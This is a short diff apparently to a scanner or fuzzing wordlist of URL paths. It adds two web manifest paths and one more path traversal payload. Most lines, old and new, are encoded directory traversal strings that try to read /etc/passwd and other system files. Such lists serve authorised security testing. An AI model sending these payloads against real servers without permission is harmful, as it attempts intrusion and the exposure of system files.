@@ -34,3 +34,6 @@
 /application/..%252F..%252F..%252F..%252F..%252Fetc
 /application/default%2C..%2F..%2F..%2F..%2F..%2Fetc
 /downloader.php?file=../../../../../../../../../../etc/passwd%00.jpg
+/manifest.webmanifest
+/manifest.json
+/api/file/temp/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
